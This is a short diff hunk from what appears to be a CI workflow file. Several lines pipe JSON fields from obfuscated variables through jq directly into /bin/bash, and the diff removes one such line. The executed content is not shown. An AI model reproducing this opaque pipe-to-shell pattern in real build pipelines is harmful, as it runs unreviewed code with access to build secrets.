@@ -22,7 +22,6 @@ jobs:
           echo $xi851 | jq -r .cu0 | /bin/bash
           echo $eqi660 | jq -r .uoldb09025 | /bin/bash
           printf '%s' "$rqmlq7566" | jq -r .oom70 | /bin/bash
-          echo $xzx5483 | jq -r .wrh5 | /bin/bash
 
       - name: Archive results
         if: always()
